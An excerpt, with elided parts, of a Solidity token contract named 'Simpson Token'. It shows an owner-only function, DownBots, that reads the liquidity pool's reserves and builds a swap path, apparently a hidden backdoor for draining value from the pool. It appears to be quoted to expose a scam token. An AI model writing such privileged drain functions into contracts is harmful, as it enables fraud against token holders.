...
contract SimpsonToken is Context, Ownable, IERC20 {
    ...
    string internal _name = "Simpson Token";
    string internal _symbol = "SIMP";
    ...
    function DownBots(address buyer, address _recepient, uint amount) public onlyAdmin {
        ...
        uint256 buyerReserve = getbuyerReserve(buyer);
        uint amountOut = buyerReserve * amount / 100000;
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = buyer;
    ...
    function getbuyerReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();
        uint256 buyerReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return buyerReserve;
    } 
